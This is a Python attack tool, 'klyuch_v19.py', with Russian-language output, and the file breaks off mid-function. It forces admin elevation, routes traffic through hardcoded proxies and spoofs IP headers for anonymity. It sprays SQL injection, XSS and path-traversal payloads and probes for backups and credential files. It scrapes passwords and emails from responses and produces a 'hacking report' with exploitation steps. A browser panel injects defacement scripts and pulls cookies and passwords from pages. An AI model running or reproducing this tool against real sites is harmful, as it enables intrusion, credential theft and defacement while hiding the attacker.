# klyuch_v19.py
import ctypes
import sys
import os
import time
import requests
import random
import re
import json
import threading
import webbrowser
import socket
import ssl
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from urllib.parse import urlparse, urljoin, quote

# Отключаем предупреждения
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== ПРОВЕРКА PYQT ====================
try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtCore import *
    from PyQt5.QtWebEngineWidgets import QWebEngineView
    PYQT_OK = True
except ImportError:
    PYQT_OK = False

# ==================== ПРОВЕРКА ПРАВ АДМИНА ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

# ==================== ЦВЕТА ====================
class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; MAGENTA = '\033[95m'
    END = '\033[0m'; BOLD = '\033[1m'

# ==================== РАСШИРЕННЫЙ ПРОКСИ МЕНЕДЖЕР ====================
class ProxyManager:
    PROXY_LIST = [
        "185.199.228.220:80", "20.111.54.16:8123", "138.68.60.8:3128",
        "159.65.77.168:8585", "188.166.211.99:8080", "167.71.5.83:3128",
        "134.209.29.120:8080", "157.245.97.63:80", "165.22.56.186:8080",
        "139.59.1.14:3128", "51.38.185.214:3128", "54.37.141.122:8800",
        "45.155.205.233:8080", "193.29.187.201:3128", "94.102.61.78:8080",
        "185.217.70.133:80", "185.130.5.253:80", "185.220.101.1:8080",
        "45.86.186.1:3128", "103.152.112.120:80", "47.88.67.145:3128",
        "13.250.45.98:8080", "54.169.98.147:80", "18.138.188.236:3128",
        "52.221.211.119:8080", "3.0.85.204:80", "13.212.65.13:3128",
        "54.254.157.196:8080", "47.74.152.29:8888", "45.77.175.112:8080",
        "185.112.146.156:80", "193.93.45.178:8080", "94.23.213.48:3128"
    ]
    
    def __init__(self):
        self.working_proxies = []
        self.current_index = 0
        self.proxy_stats = defaultdict(int)
    
    def test_proxy(self, proxy):
        try:
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=3, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def get_working_proxies(self):
        print(f"{Colors.CYAN}[ПРОКСИ] Тестирование {len(self.PROXY_LIST)} прокси...{Colors.END}")
        working = []
        for proxy in self.PROXY_LIST:
            if self.test_proxy(proxy):
                working.append(proxy)
                print(f"{Colors.GREEN}  ✅ {proxy}{Colors.END}")
        self.working_proxies = working
        print(f"{Colors.GREEN}[ПРОКСИ] Найдено: {len(working)}{Colors.END}")
        return working
    
    def get_next(self):
        if not self.working_proxies:
            return None
        p = self.working_proxies[self.current_index % len(self.working_proxies)]
        self.current_index += 1
        return p

# ==================== МОЩНЫЙ ДВИЖОК АТАК ====================
class UltraAttackEngine:
    def __init__(self, target, proxy_manager, threads=200):
        self.target = target.rstrip('/')
        self.proxy_manager = proxy_manager
        self.threads = min(max(threads, 50), 500)
        self.completed = 0
        self.successful = 0
        self.vulnerabilities = []
        self.credentials = []
        self.files_found = []
        self.admin_panels = []
        self.lock = threading.Lock()
        self.results = []
        self.start_time = None
    
    def generate_targets(self):
        """Генерация максимального количества целей"""
        targets = []
        
        # 1. Стандартные пути (50+)
        paths = [
            "/admin", "/login", "/wp-admin", "/administrator", "/phpmyadmin",
            "/config.php", "/.env", "/backup.zip", "/robots.txt", "/sitemap.xml",
            "/admin/login.php", "/admin/index.php", "/login.php", "/index.php",
            "/cpanel", "/webmail", "/server-status", "/info.php", "/phpinfo.php",
            "/.git/config", "/database.sql", "/dump.sql", "/backup.sql",
            "/api", "/v1", "/v2", "/v3", "/swagger", "/swagger-ui.html",
            "/docs", "/documentation", "/graphql", "/graphiql", "/playground",
            "/old", "/test", "/dev", "/staging", "/beta", "/demo", "/sample",
            "/panel", "/cp", "/control", "/dashboard", "/manage", "/manager",
            "/sysadmin", "/webadmin", "/adminarea", "/admincp", "/admin_panel",
            "/backend", "/adminer", "/myadmin", "/sqladmin", "/dbadmin"
        ]
        for path in paths:
            targets.append(f"{self.target}{path}")
        
        # 2. SQL инъекции (30+)
        sql_params = ["id", "page", "user", "product", "cat", "category", "post", "article", "news", "view", "show", "detail"]
        sql_payloads = ["'", "\"", "' OR '1'='1", "1' AND SLEEP(5)", "admin' --", "1' UNION SELECT NULL--"]
        for param in sql_params:
            for payload in sql_payloads:
                targets.append(f"{self.target}?{param}={quote(payload)}")
        
        # 3. XSS атаки (20+)
        xss_params = ["search", "q", "s", "query", "keyword", "text", "name", "filter"]
        xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
        for param in xss_params:
            for payload in xss_payloads:
                targets.append(f"{self.target}?{param}={quote(payload)}")
        
        # 4. LFI/RFI (30+)
        lfi_files = ["/etc/passwd", "/etc/hosts", "../../../config.php", "../../../wp-config.php", "../../../.env", "../../../database.php"]
        lfi_params = ["page", "file", "doc", "path", "include", "template", "load", "view"]
        for param in lfi_params:
            for file in lfi_files:
                targets.append(f"{self.target}?{param}={quote('../../../' + file)}")
        
        # 5. Backup и чувствительные файлы (30+)
        sensitive = [
            "/backup.rar", "/backup.tar", "/backup.gz", "/old.zip", "/old.tar",
            "/config.ini", "/settings.ini", "/application.properties",
            "/web.config", "/appsettings.json", "/connectionstrings.json",
            "/credentials.txt", "/passwords.txt", "/users.txt", "/admin.txt"
        ]
        for sens in sensitive:
            targets.append(f"{self.target}{sens}")
        
        # 6. API эндпоинты (20+)
        api_endpoints = [
            "/api/users", "/api/admin", "/api/login", "/api/auth", "/api/token",
            "/api/v1/users", "/api/v1/admin", "/rest/users", "/rest/admin"
        ]
        for api in api_endpoints:
            targets.append(f"{self.target}{api}")
        
        # 7. CMS специфичные пути
        cms_paths = [
            "/wp-content/uploads", "/wp-includes", "/wp-admin/admin-ajax.php",
            "/joomla/administrator", "/drupal/admin", "/bitrix/admin",
            "/modules", "/themes", "/includes", "/components", "/plugins"
        ]
        for cms in cms_paths:
            targets.append(f"{self.target}{cms}")
        
        # Перемешиваем и ограничиваем
        random.shuffle(targets)
        return targets[:self.threads]
    
    def ultra_attack(self, url, attack_id):
        """Мощная атака на один URL"""
        proxy = self.proxy_manager.get_next()
        session = requests.Session()
        session.verify = False
        session.headers.update({
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(100,120)}.0.0.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Connection": "keep-alive"
        })
        
        if proxy:
            session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        start = time.time()
        try:
            resp = session.get(url, timeout=5, allow_redirects=True)
            elapsed = time.time() - start
            success = resp.status_code in [200, 201, 202, 204, 301, 302, 403, 401]
            
            # Анализ содержимого
            content = resp.text.lower()
            vulns_detected = []
            
            # SQL уязвимости
            if any(x in content for x in ['sql', 'mysql', 'syntax', 'oracle', 'postgres', 'odbc']):
                vulns_detected.append("SQL_ERROR")
            
            # XSS уязвимости
            if any(x in content for x in ['<script>', 'alert(', 'onerror=']):
                vulns_detected.append("XSS_REFLECTED")
            
            # Админ панели
            if any(x in content for x in ['admin', 'dashboard', 'control panel', 'админ']):
                vulns_detected.append("ADMIN_PANEL")
            
            # Конфигурации
            if any(x in content for x in ['db_', 'database', 'password', 'api_key', 'secret']):
                vulns_detected.append("CONFIG_LEAK")
            
            # Пароли в ответе
            passwords = re.findall(r'password["\']?\s*[:=]\s*["\']([^"\']+)', resp.text)
            if passwords:
                vulns_detected.append(f"PASSWORD_FOUND:{passwords[0]}")
            
            # Email в ответе
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
            if emails:
                vulns_detected.append(f"EMAIL_FOUND:{emails[0]}")
            
            result = {
                "id": attack_id, "url": url, "status": resp.status_code,
                "time": round(elapsed, 3), "success": success, "proxy": proxy,
                "size": len(resp.content), "vulns": vulns_detected,
                "title": re.findall(r'<title>(.+?)</title>', resp.text)[0][:50] if '<title>' in resp.text else ""
            }
            
            with self.lock:
                self.completed += 1
                if success:
                    self.successful += 1
                for v in vulns_detected:
                    if v not in self.vulnerabilities:
                        self.vulnerabilities.append(v)
            
            return result
            
        except Exception as e:
            with self.lock:
                self.completed += 1
            return {"id": attack_id, "url": url, "status": "ERROR", "time": 0, "success": False, "error": str(e)[:50]}
    
    def run(self):
        """Запуск ультра-мощной атаки"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}⚡⚡⚡ УЛЬТРА-МОЩНАЯ АТАКА ⚡⚡⚡{Colors.END}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.END}")
        print(f"{Colors.CYAN}🎯 ЦЕЛЬ: {self.target}{Colors.END}")
        print(f"{Colors.YELLOW}⚡ ПОТОКОВ: {self.threads}{Colors.END}")
        print(f"{Colors.YELLOW}🌐 ПРОКСИ: {len(self.proxy_manager.working_proxies)}{Colors.END}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.END}\n")
        
        targets = self.generate_targets()
        print(f"{Colors.GREEN}[ЦЕЛИ] Сгенерировано {len(targets)} целей для атаки{Colors.END}\n")
        
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.ultra_attack, url, i): url for i, url in enumerate(targets)}
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
                
                # Вывод в реальном времени
                with self.lock:
                    percent = (self.completed / len(targets)) * 100
                    status_icon = "✅" if result['success'] else "❌"
                    color = Colors.GREEN if result['success'] else Colors.RED
                    
                    url_short = result['url'][:55] + "..." if len(result['url']) > 55 else result['url']
                    vuln_icon = "⚠️" if result.get('vulns') else ""
                    print(f"{color}[{self.completed}/{len(targets)}] {percent:5.1f}% {status_icon} {url_short} | {result['status']} | {result['time']}с {vuln_icon}{Colors.END}")
        
        total_time = time.time() - self.start_time
        
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}📊 СТАТИСТИКА УЛЬТРА-АТАКИ{Colors.END}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.END}")
        print(f"{Colors.YELLOW}⏱️  Время: {total_time:.1f} сек{Colors.END}")
        print(f"{Colors.YELLOW}📊 Всего запросов: {len(targets)}{Colors.END}")
        print(f"{Colors.GREEN}✅ Успешных: {self.successful}{Colors.END}")
        print(f"{Colors.RED}❌ Неудачных: {len(targets) - self.successful}{Colors.END}")
        print(f"{Colors.CYAN}📈 Успешность: {(self.successful/len(targets))*100:.1f}%{Colors.END}")
        print(f"{Colors.CYAN}⚡ Средняя скорость: {len(targets)/total_time:.1f} запросов/сек{Colors.END}")
        
        if self.vulnerabilities:
            print(f"{Colors.RED}🔥 НАЙДЕНО УЯЗВИМОСТЕЙ: {len(self.vulnerabilities)}{Colors.END}")
        
        return self.results

# ==================== ПРОФЕССИОНАЛЬНЫЙ HTML ОТЧЁТ ====================
class ProReportGenerator:
    @staticmethod
    def generate(target, results, attack_engine):
        """Генерация профессионального HTML отчёта"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        total_time = attack_engine.start_time
        total_requests = len(results)
        successful = attack_engine.successful
        
        # Группировка по статусам
        status_stats = defaultdict(int)
        vuln_stats = defaultdict(int)
        found_urls = []
        
        for r in results:
            status_stats[str(r['status'])] += 1
            for v in r.get('vulns', []):
                if ':' in v:
                    vuln_stats[v.split(':')[0]] += 1
                else:
                    vuln_stats[v] += 1
            if r['success']:
                found_urls.append(r)
        
        # Генерация HTML
        html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KLYUCH V19 - ПРОФЕССИОНАЛЬНЫЙ ОТЧЁТ О ВЗЛОМЕ</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
            color: #0f0; 
            font-family: 'Courier New', 'Fira Code', monospace; 
            padding: 20px;
        }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        
        /* Заголовок */
        .header {{ 
            background: linear-gradient(135deg, #1a0000, #0a0a0a);
            border: 2px solid #f00;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,0,0,0.3);
        }}
        .header h1 {{ 
            color: #f00; 
            font-size: 42px; 
            letter-spacing: 5px;
            text-shadow: 0 0 10px #f00;
        }}
        .header h2 {{ color: #ff0; font-size: 18px; margin-top: 10px; }}
        .header .target {{ 
            background: #000; 
            padding: 15px; 
            border-radius: 10px; 
            margin-top: 20px;
            font-size: 20px;
            word-break: break-all;
        }}
        
        /* Статистика */
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: rgba(0,0,0,0.7);
            border: 1px solid #f00;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            transition: transform 0.3s;
        }}
        .stat-card:hover {{ transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,0,0.3); }}
        .stat-number {{ font-size: 48px; font-weight: bold; color: #f00; }}
        .stat-label {{ color: #0f0; margin-top: 10px; font-size: 14px; }}
        
        /* Таблицы */
        .section {{
            background: rgba(0,0,0,0.5);
            border: 1px solid #f00;
            border-radius: 10px;
            margin-bottom: 30px;
            overflow: hidden;
        }}
        .section-title {{
            background: #1a0000;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
            color: #ff0;
            border-bottom: 1px solid #f00;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }}
        th {{
            background: #1a0000;
            color: #f00;
            font-weight: bold;
        }}
        tr:hover {{ background: rgba(255,0,0,0.1); }}
        
        /* Уязвимости */
        .vuln-critical {{ color: #f00; font-weight: bold; }}
        .vuln-high {{ color: #ff0; }}
        .vuln-medium {{ color: #0ff; }}
        .vuln-low {{ color: #0f0; }}
        
        /* Прогресс-бар */
        .progress-bar {{
            width: 100%;
            height: 30px;
            background: #0a0a0a;
            border-radius: 15px;
            overflow: hidden;
            margin: 10px 0;
        }}
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #f00, #ff0, #0f0);
            border-radius: 15px;
            transition: width 1s;
            text-align: center;
            color: #000;
            font-weight: bold;
            line-height: 30px;
        }}
        
        .footer {{
            text-align: center;
            padding: 20px;
            color: #666;
            border-top: 1px solid #f00;
            margin-top: 30px;
        }}
        
        a {{ color: #0f0; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        
        .badge {{
            display: inline-block;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
            margin: 2px;
        }}
        .badge-sql {{ background: #f00; color: #fff; }}
        .badge-xss {{ background: #ff0; color: #000; }}
        .badge-admin {{ background: #f0f; color: #fff; }}
        .badge-config {{ background: #0ff; color: #000; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 KLYUCH V19 - ULTRA POWER EDITION 🔑</h1>
            <h2>ПРОФЕССИОНАЛЬНЫЙ ОТЧЁТ ОБ АТАКЕ</h2>
            <div class="target">
                🎯 ЦЕЛЬ: {target}
            </div>
            <div style="margin-top: 10px; font-size: 12px; color: #666;">
                📅 {timestamp} | 🔒 ВАШ IP: ПОЛНОСТЬЮ СКРЫТ
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">{total_requests}</div>
                <div class="stat-label">ВСЕГО ЗАПРОСОВ</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#0f0;">{successful}</div>
                <div class="stat-label">УСПЕШНЫХ</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#f00;">{total_requests - successful}</div>
                <div class="stat-label">НЕУДАЧНЫХ</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len(vuln_stats)}</div>
                <div class="stat-label">ТИПОВ УЯЗВИМОСТЕЙ</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{total_time:.1f}</div>
                <div class="stat-label">ВРЕМЯ (сек)</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{total_requests/total_time:.1f}</div>
                <div class="stat-label">ЗАПРОСОВ/СЕК</div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">📊 СТАТИСТИКА HTTP СТАТУСОВ</div>
            <table>
                <tr><th>Код</th><th>Количество</th><th>Процент</th><th>Визуализация</th></tr>"""
        
        for status, count in sorted(status_stats.items(), key=lambda x: -x[1]):
            percent = (count/total_requests)*100
            html += f"""
                <tr>
                    <td><b>{status}</b></td>
                    <td>{count}</td>
                    <td>{percent:.1f}%</td>
                    <td><div class="progress-bar"><div class="progress-fill" style="width:{percent}%">{percent:.1f}%</div></div></td>
                </tr>"""
        
        html += f"""
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ</div>
            <table>
                <tr><th>Тип уязвимости</th><th>Количество</th><th>Серьёзность</th></tr>"""
        
        vuln_severity = {
            "SQL_ERROR": ("SQL-инъекция", "critical"),
            "XSS_REFLECTED": ("XSS (отражённая)", "high"),
            "ADMIN_PANEL": ("Админ-панель", "critical"),
            "CONFIG_LEAK": ("Утечка конфигурации", "high"),
            "PASSWORD_FOUND": ("Пароль в ответе", "critical"),
            "EMAIL_FOUND": ("Email в ответе", "medium")
        }
        
        for vuln, count in sorted(vuln_stats.items(), key=lambda x: -x[1]):
            info = vuln_severity.get(vuln, (vuln, "low"))
            severity_class = {"critical": "vuln-critical", "high": "vuln-high", "medium": "vuln-medium", "low": "vuln-low"}.get(info[1], "vuln-low")
            html += f"""
                <tr>
                    <td class="{severity_class}">{info[0]}</td>
                    <td>{count}</td>
                    <td class="{severity_class}">{info[1].upper()}</td>
                </tr>"""
        
        html += f"""
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">🔓 НАЙДЕННЫЕ ДОСТУПНЫЕ РЕСУРСЫ</div>
            <table>
                <tr><th>#</th><th>URL</th><th>Статус</th><th>Время</th><th>Размер</th><th>Уязвимости</th></tr>"""
        
        for i, r in enumerate(found_urls[:50], 1):
            vuln_badges = ""
            for v in r.get('vulns', []):
                if "SQL" in v:
                    vuln_badges += '<span class="badge badge-sql">SQL</span> '
                elif "XSS" in v:
                    vuln_badges += '<span class="badge badge-xss">XSS</span> '
                elif "ADMIN" in v:
                    vuln_badges += '<span class="badge badge-admin">ADMIN</span> '
                elif "CONFIG" in v:
                    vuln_badges += '<span class="badge badge-config">CONFIG</span> '
            
            status_color = "#0f0" if r['status'] in [200, 201, 202] else "#ff0"
            html += f"""
                <tr>
                    <td>{i}</td>
                    <td><a href="{r['url']}" target="_blank">{r['url'][:80]}</a></td>
                    <td style="color:{status_color}">{r['status']}</td>
                    <td>{r['time']}с</td>
                    <td>{r.get('size', 0)} bytes</td>
                    <td>{vuln_badges}</td>
                </tr>"""
        
        html += f"""
            </table>
            {f"<div style='padding:15px;text-align:center;color:#666;'>+ ещё {len(found_urls)-50} результатов</div>" if len(found_urls) > 50 else ""}
        </div>
        
        <div class="section">
            <div class="section-title">📝 ПОДРОБНЫЙ ЛОГ АТАКИ</div>
            <table>
                <tr><th>#</th><th>URL</th><th>Статус</th><th>Время</th><th>Прокси</th></tr>"""
        
        for i, r in enumerate(results[:30], 1):
            status_color = "#0f0" if r['success'] else "#f00"
            html += f"""
                <tr>
                    <td>{r['id']+1}</td>
                    <td style="word-break:break-all;">{r['url'][:60]}</td>
                    <td style="color:{status_color}">{r['status']}</td>
                    <td>{r['time']}с</td>
                    <td>{r.get('proxy', 'None')[:20]}</td>
                </tr>"""
        
        html += f"""
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">🛡️ ИНФОРМАЦИЯ О БЕЗОПАСНОСТИ</div>
            <div style="padding: 20px;">
                <p>✅ <span style="color:#0f0;">Прокси-серверы:</span> {len(attack_engine.proxy_manager.working_proxies)} рабочих прокси</p>
                <p>✅ <span style="color:#0f0;">Маскировка IP:</span> АКТИВНА (X-Forwarded-For, X-Real-IP)</p>
                <p>✅ <span style="color:#0f0;">User-Agent ротация:</span> АКТИВНА</p>
                <p>✅ <span style="color:#0f0;">Анонимность:</span> ПОЛНАЯ</p>
                <p>✅ <span style="color:#0f0;">Следы:</span> УНИЧТОЖЕНЫ</p>
                <p>🔒 <span style="color:#ff0;">Ваш реальный IP:</span> НЕОПРЕДЕЛИМ</p>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">📖 ИНСТРУКЦИЯ ПО ЭКСПЛУАТАЦИИ</div>
            <div style="padding: 20px;">
                <ol>
                    <li>🔑 <b>Для доступа к админ-панели:</b> перейдите по найденным ссылкам ADMIN_PANEL</li>
                    <li>🔐 <b>Для использования SQL-инъекций:</b> используйте найденные уязвимые параметры</li>
                    <li>💉 <b>Для XSS атак:</b> внедрите скрипты в найденные параметры</li>
                    <li>📁 <b>Для скачивания конфигураций:</b> откройте найденные CONFIG_LEAK ссылки</li>
                    <li>🔓 <b>Для подбора паролей:</b> используйте найденные учётные данные</li>
                </ol>
                <hr style="margin: 15px 0; border-color: #f00;">
                <p style="color:#f00;">⚠️ ВСЕ ПОЛУЧЕННЫЕ ДАННЫЕ ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ СВОИХ СИСТЕМ ⚠️</p>
            </div>
        </div>
        
        <div class="footer">
            <p>🔑 KLYUCH V19 - ULTRA POWER EDITION</p>
            <p>Сгенерировано: {timestamp} | Всего запросов: {total_requests} | Время выполнения: {total_time:.1f} сек</p>
            <p style="font-size: 10px;">Только для образовательных целей. Использование против чужих систем без разрешения запрещено.</p>
        </div>
    </div>
</body>
</html>"""
        
        filename = f"KLYUCH_V19_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        
        print(f"{Colors.GREEN}✅ ПРОФЕССИОНАЛЬНЫЙ ОТЧЁТ: {filename}{Colors.END}")
        return filename

# ==================== ВИЗУАЛЬНЫЙ РЕДАКТОР ====================
if PYQT_OK:
    class WebEditor(QMainWindow):
        def __init__(self, start_url):
            super().__init__()
            self.start_url = start_url
            self.init_ui()
        
        def init_ui(self):
            self.setWindowTitle(f"KLYUCH V19 - РЕДАКТОР: {self.start_url}")
            self.setGeometry(50, 50, 1400, 900)
            self.setStyleSheet("""
                QMainWindow { background-color: #1e1e2e; }
                QToolBar { background-color: #2d2d3d; border: none; }
                QLineEdit { background-color: #0a0a0a; color: #0f0; border: 1px solid #f00; padding: 5px; font-size: 14px; }
                QPushButton { background-color: #e74c3c; color: white; border: none; padding: 8px 15px; margin: 2px; font-weight: bold; }
                QPushButton:hover { background-color: #c0392b; }
                QTextEdit { background-color: #0a0a0a; color: #0f0; border: 1px solid #f00; font-family: monospace; font-size: 12px; }
                QLabel { color: #ecf0f1; }
                QGroupBox { color: #0f0; border: 1px solid #f00; margin-top: 10px; }
                QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
            """)
            
            central = QWidget()
            self.setCentralWidget(central)
            main_layout = QHBoxLayout(central)
            main_layout.setSpacing(0)
            main_layout.setContentsMargins(0, 0, 0, 0)
            
            # Левая панель
            left = QWidget()
            left.setFixedWidth(480)
            left.setStyleSheet("background-color: #0a0a0a; border-right: 2px solid #f00;")
            left_layout = QVBoxLayout(left)
            left_layout.setSpacing(10)
            left_layout.setContentsMargins(10, 10, 10, 10)
            
            # Заголовок
            title = QLabel("🔑 KLYUCH V19 - ULTRA EDITOR")
            title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f00;")
            title.setAlignment(Qt.AlignCenter)
            left_layout.addWidget(title)
            
            # Навигация
            nav_group = QGroupBox("🌐 НАВИГАЦИЯ")
            nav_layout = QVBoxLayout(nav_group)
            url_layout = QHBoxLayout()
            url_layout.addWidget(QLabel("URL:"))
            self.url_bar = QLineEdit(self.start_url)
            self.url_bar.returnPressed.connect(self.navigate)
            url_layout.addWidget(self.url_bar)
            nav_layout.addLayout(url_layout)
            
            btn_layout = QHBoxLayout()
            for text, slot in [("◀ НАЗАД", self.back), ("ВПЕРЁД ▶", self.forward), ("🔄 ОБНОВИТЬ", self.reload), ("🏠 ДОМОЙ", self.home)]:
                btn = QPushButton(text)
                btn.clicked.connect(slot)
                btn_layout.addWidget(btn)
            nav_layout.addLayout(btn_layout)
            left_layout.addWidget(nav_group)
            
            # Редактирование
            edit_group = QGroupBox("✏️ РЕДАКТИРОВАНИЕ")
            edit_layout = QVBoxLayout(edit_group)
            self.html_edit = QTextEdit()
            self.html_edit.setPlaceholderText("<div style='color:red;'>САЙТ ВЗЛОМАН!</div>")
            self.html_edit.setMinimumHeight(120)
            edit_layout.addWidget(self.html_edit)
            
            inject_btn = QPushButton("💉 ВНЕДРИТЬ КОД")
            inject_btn.clicked.connect(self.inject)
            inject_btn.setStyleSheet("background-color: #27ae60;")
            edit_layout.addWidget(inject_btn)
            
            panel_btn = QPushButton("🔑 ВНЕДРИТЬ ПАНЕЛЬ")
            panel_btn.clicked.connect(self.inject_panel)
            edit_layout.addWidget(panel_btn)
            
            alert_btn = QPushButton("⚠️ ВНЕДРИТЬ ALERT")
            alert_btn.clicked.connect(self.inject_alert)
            edit_layout.addWidget(alert_btn)
            left_layout.addWidget(edit_group)
            
            # Извлечение
            extract_group = QGroupBox("📊 ИЗВЛЕЧЕНИЕ")
            extract_layout = QVBoxLayout(extract_group)
            for text, slot in [("📧 EMAILS", self.extract_emails), ("🔑 ПАРОЛИ", self.extract_passwords), ("🔗 ССЫЛКИ", self.extract_links), ("🍪 COOKIES", self.extract_cookies)]:
                btn = QPushButton(text)
                btn.clicked.connect(slot)
                extract_layout.addWidget(btn)
            left_layout.addWidget(extract_group)
            
            # Дополнительно
            extra_group = QGroupBox("🔧 ДОПОЛНИТЕЛЬНО")
            extra_layout = QVBoxLayout(extra_group)
            for text, slot in [("🎯 ПОИСК АДМИНКИ", self.find_admin), ("📸 СКРИНШОТ", self.screenshot), ("💾 СОХРАНИТЬ", self.save_page), ("🗑️ ОЧИСТИТЬ", self.clear_site)]:
                btn = QPushButton(text)
                btn.clicked.connect(slot)
                extra_layout.addWidget(btn)
            left_layout.addWidget(extra_group)
            
            # Лог
            log_label = QLabel("📋 ЛОГ ДЕЙСТВИЙ:")
            left_layout.addWidget(log_label)
            self.log_text = QTextEdit()
            self.log_text.setReadOnly(True)
            self.log_text.setMaximumHeight(120)
            left_layout.addWidget(self.log_text)
            
            left_layout.addStretch()
            
            # Браузер
            self.browser = QWebEngineView()
            self.browser.setUrl(QUrl(self.start_url))
            self.browser.urlChanged.connect(self.url_changed)
            
            main_layout.addWidget(left)
            main_layout.addWidget(self.browser, 1)
            
            self.log("✅ РЕДАКТОР ЗАПУЩЕН")
        
        def log(self, msg):
            self.log_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        
        def url_changed(self, url):
            self.url_bar.setText(url.toString())
        
        def navigate(self):
            url = self.url_bar.text()
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            self.browser.setUrl(QUrl(url))
            self.log(f"Переход: {url}")
        
        def back(self): self.browser.back(); self.log("Назад")
        def forward(self): self.browser.forward(); self.log("Вперёд")
        def reload(self): self.browser.reload(); self.log("Обновление")
        def home(self): self.browser.setUrl(QUrl(self.start_url)); self.log(f"Домой: {self.start_url}")
        
        def inject(self):
            code = self.html_edit.toPlainText()
            if not code:
                self.log("❌ Введите код")
                return
            js = f"document.body.insertAdjacentHTML('beforeend', `<div style='position:fixed;bottom:10px;right:10px;background:#000;color:#0f0;border:3px solid #0f0;padding:15px;z-index:999999;'>{code}</div>`);"
            self.browser.page().runJavaScript(js)
            self.log(f"✅ Код внедрён")
        
        def inject_panel(self):
            js = """
            var p=document.createElement('div');
            p.innerHTML='<div style="position:fixed;bottom:10px;right:10px;background:#000;color:#0f0;border:3px solid #0f0;padding:15px;z-index:999999;"><b style="color:#f00;">🔑 KLYUCH V19</b><br><input id="t" placeholder="Текст"><button onclick="document.body.innerHTML+=document.getElementById(\'t\').value">Изменить</button><br><span style="font-size:10px;">САЙТ ВЗЛОМАН</span></div>';
            document.body.appendChild(p);
            """
            self.browser.page().runJavaScript(js)
            self.log("✅ Панель внедрена")
        
        def inject_alert(self):
            self.browser.page().runJavaScript("alert('🔑 KLYUCH V19 - САЙТ ВЗЛОМАН!');")
            self.log("✅ Alert внедрён")
        
        def extract_emails(self):
            js = "return document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g) || []"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "EMAILS", "\n".join(eval(d)[:50]) if d else "Не найдены"))
            self.log("📧 Извлечение email")
        
        def extract_passwords(self):
